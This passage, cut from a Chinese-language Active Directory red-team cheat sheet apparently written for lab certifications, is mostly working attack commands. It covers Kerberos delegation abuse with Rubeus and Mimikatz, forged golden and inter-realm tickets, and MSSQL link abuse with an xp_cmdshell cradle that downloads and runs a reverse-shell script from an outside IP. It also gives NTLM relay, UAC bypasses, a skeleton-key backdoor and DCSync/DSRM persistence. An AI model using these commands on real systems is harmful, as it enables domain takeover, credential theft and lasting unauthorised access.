class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="不受限制的委托"><a href="#不受限制的委托" class="headerlink" title="不受限制的委托"></a><strong>不受限制的委托</strong></h3><p>可以在<em>前端服务</em>（例如IIS Web服务器）上设置，以允许它代表用户委派<em>域中的任何服务</em>（向<em>后端服务</em>（例如MSSQL数据库））。</p><p>DACL UAC属性： <code>TrustedForDelegation</code>.</p><h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>在设置了无限制委派的服务器上具有管理特权时，我们可以为具有连接的其他用户转储TGT。使用Mimikatz：</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">sekurlsa::tickets /exportkerberos::ptt c:\path\to\ticket.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或与Rubeus一起使用</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe klist<span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe dump <span class="token operator">/</span>luid:0x5379f2 <span class="token operator">/</span>nowrap<span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe ptt <span class="token operator">/</span>ticket:doIFSDCC<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果该DC容易受到打印机错误的影响，我们还可以获得域控制器计算机帐户的哈希值。在具有无限制委派的服务器上，使用Rubeus监视新票证。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe monitor <span class="token operator">/</span>interval:5 <span class="token operator">/</span>nowrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从攻击机上诱使域控制器使用打印机错误进行连接。从<a href="https://github.com/leechristensen/SpoolSample">这里</a>二进制。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\MS<span class="token operator">-</span>RPRN<span class="token punctuation">.</span>exe \\dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local \\dcorp<span class="token operator">-</span>appsrv<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>DC的机器帐户的TGT应该在第一个会话中出现。我们可以传递此票证以获得DCSync特权。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe ptt <span class="token operator">/</span>ticket:doIFxTCCBc<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a><strong>约束委派</strong></h3><p>可以在<em>前端服务器</em>（例如IIS）上设置约束委派，以允许它代表用户<em>仅</em>委派给<em>选定的后端服务</em>（例如MSSQL）。</p><p>DACL UAC属性：<code>TrustedToAuthForDelegation</code>。这允许<code>s4u2self</code>（即，仅使用NTLM密码哈希值）代表<em>任何人</em>自己请求TGS 。这有效地允许该服务仅使用他们的哈希来模拟域中的其他用户，并且在用户和前端之间不使用Kerberos的情况下非常有用。</p><p>DACL属性：<code>msDS-AllowedToDelegateTo</code>。此属性包含允许在其上使用的SPN <code>s4u2proxy</code>，即基于现有TGS（例如，从中使用所获得的TGS）请求该服务器的可转发TGS <code>s4u2self</code>。这有效地定义了允许委派委派的后端服务。</p><p><strong>注意：</strong>这些属性不一定必须并存！如果<code>s4u2proxy</code>不允许使用<code>s4u2self</code>，则需要用户交互才能从用户获得有效的TGS到前端服务，类似于无约束委派。</p><h4 id="Exploitation-2"><a href="#Exploitation-2" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>在这种情况下，我们使用Rubeus自动请求TGT，然后使用带有<code>ldap</code>SPN的TGS，以允许我们使用计算机帐户进行DCSync。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># Get a TGT using the compromised service account with delegation set (if needed)</span><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe asktgt <span class="token operator">/</span>user:sa_with_delegation <span class="token operator">/</span>domain:domain<span class="token punctuation">.</span>com <span class="token operator">/</span>rc4:2892D26CDF84D7A70E2EB3B9F05C425E<span class="token comment" spellcheck="true"># Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN</span><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>ticket:doIE<span class="token operator">+</span>jCCBP<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">/</span>impersonateuser:Administrator <span class="token operator">/</span>msdsspn:time<span class="token operator">/</span>dc <span class="token operator">/</span>ptt<span class="token comment" spellcheck="true"># Same as above, but access the LDAP service on the DC (for dcsync) using pw hash</span><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>user:sa_with_delegation <span class="token operator">/</span>impersonateuser:Administrator <span class="token operator">/</span>msdsspn:time<span class="token operator">/</span>dc <span class="token operator">/</span>altservice:ldap <span class="token operator">/</span>ptt <span class="token operator">/</span>rc4:2892D26CDF84D7A70E2EB3B9F05C425E<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a><strong>基于资源的约束委派</strong></h3><p>基于资源的约束委派（RBCD）将<em>后端服务器</em>（例如MSSQL）配置为<em>仅</em>允许<em>选定的前端服务</em>（例如IIS）代表用户进行委派。这使特定的服务器管理员可以更轻松地配置委派，而无需域管理员权限。</p><p>DACL属性：<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>。</p><p>在这种情况下，<code>s4u2self</code>并且和<code>s4u2proxy</code>一样用于代表用户请求可转发票证。但是，使用RBCD，KDC会检查<em>后端服务</em>的属性中是否存在用于请求服务（即<em>前端服务</em>）的SPN 。这意味着<em>前端服务</em>需要设置SPN。因此，必须从具有SPN的服务帐户或计算机帐户对RBC进行攻击。<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></p><h4 id="Exploitation-3"><a href="#Exploitation-3" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>如果我们损害出现在<em>后端服务</em>的RBCD属性中的<em>前端服务</em>，则利用与上面的受约束委派相同。但是，这不太常见。</p><p>更经常看到攻击RBCD是当我们有<code>GenericWrite</code>，<code>GenericAll</code>，<code>WriteProperty</code>，或<code>WriteDACL</code>许可在域中的计算机对象。这意味着我们可以<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>在该计算机帐户上写入属性，以添加受信任的SPN或计算机帐户以进行委派。我们甚至可以创建一个新的计算机帐户并添加它。就像上面的约束委派一样，这使我们可以在任何用户的上下文中破坏目标计算机。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># Create a new machine account using PowerMad</span>New<span class="token operator">-</span>MachineAccount <span class="token operator">-</span>MachineAccount InconspicuousMachineAccount <span class="token operator">-</span>Password $<span class="token punctuation">(</span>ConvertTo<span class="token operator">-</span>SecureString <span class="token string">'Compromised123!'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target</span><span class="token variable">$sid</span> = Get<span class="token operator">-</span>DomainComputer <span class="token operator">-</span>Identity InconspicuousMachineAccount <span class="token operator">-</span>Properties objectsid <span class="token punctuation">|</span> <span class="token function">Select</span> <span class="token operator">-</span>Expand objectsid<span class="token variable">$SD</span> = <span class="token function">New-Object</span> Security<span class="token punctuation">.</span>AccessControl<span class="token punctuation">.</span>RawSecurityDescriptor <span class="token operator">-</span>ArgumentList <span class="token string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;<span class="token function"><span class="token punctuation">;</span>$<span class="token punctuation">(</span><span class="token variable">$sid</span><span class="token punctuation">)</span></span>)"</span><span class="token variable">$SDbytes</span> = <span class="token function">New-Object</span> byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token variable">$SD</span><span class="token punctuation">.</span>BinaryLength<span class="token punctuation">)</span><span class="token variable">$SD</span><span class="token punctuation">.</span>GetBinaryForm<span class="token punctuation">(</span><span class="token variable">$SDbytes</span><span class="token punctuation">,</span>0<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target</span>Get<span class="token operator">-</span>DomainComputer <span class="token operator">-</span>Identity TargetSrv01 <span class="token punctuation">|</span> <span class="token function">Set</span><span class="token operator">-</span>DomainObject <span class="token operator">-</span><span class="token function">Set</span> @&amp;<span class="token comment" spellcheck="true">#123;'msdsallowedtoactonbehalfofotheridentity'=$SDBytes&amp;#125;</span><span class="token comment" spellcheck="true"># Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target</span><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe s4u <span class="token operator">/</span>user:InconspicuousMachineAccount$ <span class="token operator">/</span>rc4:3644AC5E3D9441CCBCEF08CBAF98E910 <span class="token operator">/</span>impersonateuser:Administrator <span class="token operator">/</span>msdsspn:CIFS<span class="token operator">/</span>TargetSrv01<span class="token punctuation">.</span>corp1<span class="token punctuation">.</span>com <span class="token operator">/</span>ptt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="滥用域信任"><a href="#滥用域信任" class="headerlink" title="滥用域信任"></a><strong>滥用域信任</strong></h3><p>必须以DA特权运行。</p><h4 id="使用域信任密钥"><a href="#使用域信任密钥" class="headerlink" title="使用域信任密钥"></a><strong>使用域信任密钥</strong></h4><p>从DC中，<code>currentdomain\targetdomain$</code>使用<code>Mimikatz</code>（例如，使用<code>LSADump</code>或<code>DCSync</code>）转储信任帐户的哈希。然后，使用此信任密钥和域<code>SID</code>，使用<code>Mimikatz</code>伪造一个跨域<code>TGT</code>，将目标域的企业管理员组的<code>SID</code>添加到我们的“ <code>SID history</code>”中。</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用Rubeus.</p><blockquote><p>确保您具有正确的Rubeus版本。由于某些原因，我的某些编译二进制文件给出了错误<code>KDC_ERR_WRONG_REALM</code>，而CRTP提供的版本可以正常工作。</p></blockquote><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe asktgs <span class="token operator">/</span>ticket:c:\ad\tools\mcorp<span class="token operator">-</span>ticket<span class="token punctuation">.</span>kirbi <span class="token operator">/</span>service:LDAP<span class="token operator">/</span>mcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">/</span>dc:mcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">/</span>ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在，我们可以DCSync目标域（请参见下文）。</p><h4 id="使用krbtgt哈希"><a href="#使用krbtgt哈希" class="headerlink" title="使用krbtgt哈希"></a><strong>使用krbtgt哈希</strong></h4><p>F从DC中，使用DCSync或LSADump转储krbtgt哈希。然后，像以前的方法一样，使用此哈希，使用Mimikatz伪造一个跨域TGT。</p><p>使用SID历史（<code>/sids</code>的）<code>*-516</code>和<code>S-1-5-9</code>以伪装的域控制器组和企业域控制器分别是在日志中的噪声低。</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:dcorp-dc$ /groups:516 /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果您在创建此票证时遇到问题，请尝试添加“ target”标志，例如<code>/target:moneycorp.local</code>.</p></blockquote><p>或者，生成具有EA组的SID历史记录的域管理员票证。</p><pre><code>kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt</code></pre><p>现在，我们可以立即DCSync目标域，或使用计划任务获取反向shell。</p><h3 id="滥用林间信任"><a href="#滥用林间信任" class="headerlink" title="滥用林间信任"></a><strong>滥用林间信任</strong></h3><p>由于林是安全边界，因此我们只能访问已与我们入侵的域（我们的源域）共享的域服务。使用例如BloodHound查找在两个林中都具有帐户（具有相同用户名）的用户，然后尝试重用密码。此外，我们可以使用PowerView来搜寻林之间的外部组成员身份。</p><pre class="line-numbers language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>DomainForeignGroupMember <span class="token operator">-</span>domain corp2<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在某些情况下，可能会在林之间<em>禁用</em>SID过滤（导致上述情况的保护）。如果您运行<code>Get-DomainTrust</code>并看到该<code>TREAT_AS_EXTERNAL</code>属性，便是这种情况！在这种情况下，如上所述，您可以像域信任一样滥用目录林信任。请注意，您仍然可以<em>不</em>伪造车票500和1000之间的任何SID的，所以你不能成为DA（甚至没有间接通过组继承）。在这种情况下，寻找在域控制器上授予本地管理员或类似非域特权的组。有关更多信息，请参阅<a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">此博客文章</a>。</p><p>要模拟来自我们源域的用户以访问外部域中的服务，我们可以执行以下操作。如上述“使用域信任密钥”中那样提取林间信任密钥。</p><p>使用Mimikatz通过信任密钥为目标域生成TGT：</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">Kerberos::golden /user:Administrator /service:krbtgt /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:eurocorp.local /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:eucorp-tgt.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，使用Rubeus<code>CIFS</code>使用该TGT向TGS询问例如目标DC上的服务。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\Rubeus<span class="token punctuation">.</span>exe asktgs <span class="token operator">/</span>ticket:c:\ad\tools\eucorp<span class="token operator">-</span>tgt<span class="token punctuation">.</span>kirbi <span class="token operator">/</span>service:CIFS<span class="token operator">/</span>eurocorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>eurocorp<span class="token punctuation">.</span>local <span class="token operator">/</span>dc:eurocorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>eurocorp<span class="token punctuation">.</span>local <span class="token operator">/</span>ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在，我们可以将目标林的DC上的CIFS服务用作源域的DA（同样，只要此信任关系已配置为存在）。</p><h3 id="滥用MSSQL数据库进行横向移动"><a href="#滥用MSSQL数据库进行横向移动" class="headerlink" title="滥用MSSQL数据库进行横向移动"></a>滥用MSSQL数据库进行横向移动</h3><p>可以链接MSSQL数据库，这样，如果您破坏了一个数据库，则可以在特定用户（<code>sa</code>也许是）的上下文中对其他数据库执行查询（甚至命令！）。这甚至可以跨森林工作！如果执行SQL，则可以使用以下命令枚举数据库链接。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 查找链接的服务器</span><span class="token keyword">EXEC</span> sp_linkedservers<span class="token comment" spellcheck="true">-- 在链接服务器上运行SQL查询</span><span class="token keyword">select</span> mylogin <span class="token keyword">from</span> <span class="token keyword">openquery</span><span class="token punctuation">(</span><span class="token string">"dc01"</span><span class="token punctuation">,</span> <span class="token string">'select SYSTEM_USER as mylogin'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">-- 在远程服务器上启用“ xp_cmdshell”并执行命令</span><span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'sp_configure '</span><span class="token string">'show advanced options'</span><span class="token string">', 1; reconfigure'</span><span class="token punctuation">)</span> AT DC01<span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'sp_configure '</span><span class="token string">'xp_cmdshell'</span><span class="token string">', 1; reconfigure'</span><span class="token punctuation">)</span> AT DC01<span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'xp_cmdshell '</span><span class="token string">'whoami'</span><span class="token string">' '</span><span class="token punctuation">)</span> AT DC01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们还可以使用<a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a>在域中查找数据库，并收集有关（可达）数据库的更多信息。我们还可以自动在链接的数据库中查找并执行查询或命令（甚至通过多层数据库链接）。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 获取域中的MSSQL数据库，并测试连通性</span>Get<span class="token operator">-</span>SQLInstanceDomain <span class="token punctuation">|</span> Get<span class="token operator">-</span>SQLConnectionTestThreaded <span class="token punctuation">|</span> <span class="token function">ft</span><span class="token comment" spellcheck="true"># 尝试获取所有域数据库上的信息</span>Get<span class="token operator">-</span>SQLInstanceDomain <span class="token punctuation">|</span> Get<span class="token operator">-</span>SQLServerInfo<span class="token comment" spellcheck="true"># 在单个可访问的数据库上获取信息</span>Get<span class="token operator">-</span>SQLServerInfo <span class="token operator">-</span>Instance dcorp<span class="token operator">-</span>mssql<span class="token comment" spellcheck="true"># 扫描MSSQL错误配置以升级到SA</span>Invoke<span class="token operator">-</span>SQLAudit <span class="token operator">-</span>Verbose <span class="token operator">-</span>Instance UFC<span class="token operator">-</span>SQLDEV<span class="token comment" spellcheck="true"># 执行SQL查询</span>Get<span class="token operator">-</span>SQLQuery <span class="token operator">-</span>Query <span class="token string">"SELECT system_user"</span> <span class="token operator">-</span>Instance UFC<span class="token operator">-</span>SQLDEV<span class="token comment" spellcheck="true"># 运行命令（需要启用XP_CMDSHELL）</span>Invoke<span class="token operator">-</span>SQLOSCmd <span class="token operator">-</span>Instance devsrv <span class="token operator">-</span>Command <span class="token string">"whoami"</span> <span class="token punctuation">|</span>  <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty CommandResults<span class="token comment" spellcheck="true"># 自动查找所有链接的数据库</span>Get<span class="token operator">-</span>SqlServerLinkCrawl <span class="token operator">-</span>Instance dcorp<span class="token operator">-</span>mssql <span class="token punctuation">|</span> <span class="token function">select</span> instance<span class="token punctuation">,</span>links <span class="token punctuation">|</span> <span class="token function">ft</span><span class="token comment" spellcheck="true"># 如果在任何链接的数据库上启用了XP_CMDSHELL，则运行命令</span>Get<span class="token operator">-</span>SqlServerLinkCrawl <span class="token operator">-</span>Instance dcorp<span class="token operator">-</span>mssql <span class="token operator">-</span>Query <span class="token string">'EXEC xp_cmdshell "whoami"'</span> <span class="token punctuation">|</span> <span class="token function">select</span> instance<span class="token punctuation">,</span>links<span class="token punctuation">,</span>customquery <span class="token punctuation">|</span> <span class="token function">ft</span>Get<span class="token operator">-</span>SqlServerLinkCrawl <span class="token operator">-</span>Instance dcorp<span class="token operator">-</span>mssql <span class="token operator">-</span>Query <span class="token string">'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"'</span> <span class="token punctuation">|</span> <span class="token function">select</span> instance<span class="token punctuation">,</span>links<span class="token punctuation">,</span>customquery <span class="token punctuation">|</span> <span class="token function">ft</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果您具有对MSSQL数据库的低特权访问权限，并且不存在任何链接，则有可能通过使用<code>xp_dirtree</code>存储过程访问此共享来强制执行NTLM身份验证。如果成功，则可以收集SQL服务帐户的NetNTLM，并可能将其破解或中继，以破坏作为该服务帐户的计算机。</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">"\\192.168.49.67\share"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>中继哈希以通过身份验证为本地admin的示例命令（如果服务帐户具有这些特权）并运行<code>calc.exe</code>。忽略该<code>-c</code>参数尝试尝试<code>secretsdump</code>。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c <span class="token string">'calc.exe'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><p>有关更多信息（包括Windows和Linux），请参阅我的<a href="https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/">OSCP备忘单和命令参考</a>。</p><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 检查易受攻击的程序和配置</span>Invoke<span class="token operator">-</span>AllChecks<span class="token comment" spellcheck="true"># 利用易受攻击的服务权限（不需要触摸磁盘）</span>Invoke<span class="token operator">-</span>ServiceAbuse <span class="token operator">-</span>Name <span class="token string">"AbyssWebServer"</span> <span class="token operator">-</span>Command <span class="token string">"net localgroup Administrators domain\user /add"</span><span class="token comment" spellcheck="true"># 利用易受攻击的服务权限触发稳定的beacon</span><span class="token function">Write</span><span class="token operator">-</span>ServiceBinary <span class="token operator">-</span>Name <span class="token string">'AbyssWebServer'</span> <span class="token operator">-</span>Command <span class="token string">'c:\windows\system32\rundll32 c:\Users\Student355\Downloads\go_dll_rtl_x64.dll,Update'</span> <span class="token operator">-</span>Path <span class="token string">'C:\WebServer\Abyss'</span>net stop AbyssWebServernet <span class="token function">start</span> AbyssWebServer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass  UAC"></a>Bypass  UAC</h3><p>使用<a href="https://github.com/FatRodzianko/SharpBypassUAC">SharpBypassUAC</a>。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 生成EncodedCommand</span><span class="token keyword">echo</span> -n <span class="token string">'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update'</span> <span class="token operator">|</span> base64<span class="token comment" spellcheck="true"># 使用 SharpBypassUAC e.g. 从CobaltStrike 的一个beacon</span>beacon<span class="token operator">></span> execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在某些情况下，运行手动Bypass  UAC （例如FODHelper bypass）可能会变得更好，而FODHelper旁路在PowerShell中执行起来非常简单。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># The command to execute in high integrity context</span><span class="token variable">$cmd</span> = <span class="token string">"cmd /c start powershell.exe"</span> <span class="token comment" spellcheck="true"># Set the registry values</span><span class="token function">New-Item</span> <span class="token string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="token operator">-</span>Force<span class="token function">New-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="token operator">-</span>Name <span class="token string">"DelegateExecute"</span> <span class="token operator">-</span>Value <span class="token string">""</span> <span class="token operator">-</span>Force<span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="token operator">-</span>Name <span class="token string">"(default)"</span> <span class="token operator">-</span>Value <span class="token variable">$cmd</span> <span class="token operator">-</span>Force <span class="token comment" spellcheck="true"># Trigger fodhelper to perform the bypass</span><span class="token function">Start-Process</span> <span class="token string">"C:\Windows\System32\fodhelper.exe"</span> <span class="token operator">-</span>WindowStyle Hidden <span class="token comment" spellcheck="true"># Clean registry</span><span class="token function">Start-Sleep</span> 3<span class="token function">Remove-Item</span> <span class="token string">"HKCU:\Software\Classes\ms-settings\"</span> <span class="token operator">-</span>Recurse <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h2><h3 id="启动文件夹"><a href="#启动文件夹" class="headerlink" title="启动文件夹"></a>启动文件夹</h3><p>只需删除一个二进制文件即可。经典😎🚩</p><p>在当前用户文件夹中，将在当前用户登录时触发：</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或在启动文件夹中，需要管理特权，但在启动时<em>以及</em>任何用户登录时将以SYSTEM身份触发：</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="域持久性"><a href="#域持久性" class="headerlink" title="域持久性"></a>域持久性</h2><p>必须以DA特权运行。</p><h3 id="Mimikatz万能钥匙攻击"><a href="#Mimikatz万能钥匙攻击" class="headerlink" title="Mimikatz万能钥匙攻击"></a>Mimikatz万能钥匙攻击</h3><p>从DC运行。为所有用户🚩启用密码“ mimikatz”。</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">privilege::debugmisc::skeleton<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="使用PowerView授予特定的用户DCSync权限"><a href="#使用PowerView授予特定的用户DCSync权限" class="headerlink" title="使用PowerView授予特定的用户DCSync权限"></a>使用PowerView授予特定的用户DCSync权限</h3><p>随时为您提供用户选择的DCSync权限。在某些设置中可能会逃避检测。</p><pre class="line-numbers language-powershell"><code class="language-powershell">Add<span class="token operator">-</span>ObjectACL <span class="token operator">-</span>TargetDistinguishedName <span class="token string">"dc=dollarcorp,dc=moneycorp,dc=local"</span> <span class="token operator">-</span>PrincipalSamAccountName student355 <span class="token operator">-</span>Rights DCSync<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="域控制器DSRM管理员"><a href="#域控制器DSRM管理员" class="headerlink" title="域控制器DSRM管理员"></a>域控制器DSRM管理员</h3><p>DSRM管理员是DC的本地管理员帐户。首先需要启用远程登录。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">New-ItemProperty</span> <span class="token string">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span> <span class="token operator">-</span>Name <span class="token string">"DsrmAdminLogonBehavior"</span> <span class="token operator">-</span>Value 2 <span class="token operator">-</span>PropertyType DWORD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在，我们可以使用之前转储在DC上的本地管理哈希值远程登录（使用<code>lsadump::sam</code>，请参见下面的“使用Mimikatz转储秘密”）。使用例如“越过哈希”来获得会话（请参见上面的“ Mimikatz”）。</p><h3 id="修改安全描述符以进行远程WMI访问"><a href="#修改安全描述符以进行远程WMI访问" class="headerlink" title="修改安全描述符以进行远程WMI访问"></a>修改安全描述符以进行远程WMI访问</h3><p>使用<code>Set-RemoteWMI.ps1</code>cmdlet向用户WMI访问计算机。可以运行以持久访问例如DC。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>RemoteWMI <span class="token operator">-</span>UserName student1 <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">-</span>namespace <span class="token string">'root\cimv2'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有关执行，请参见上面的“使用WMI执行命令”。</p><h3 id="修改PowerShell远程访问的安全描述符"><a href="#修改PowerShell远程访问的安全描述符" class="headerlink" 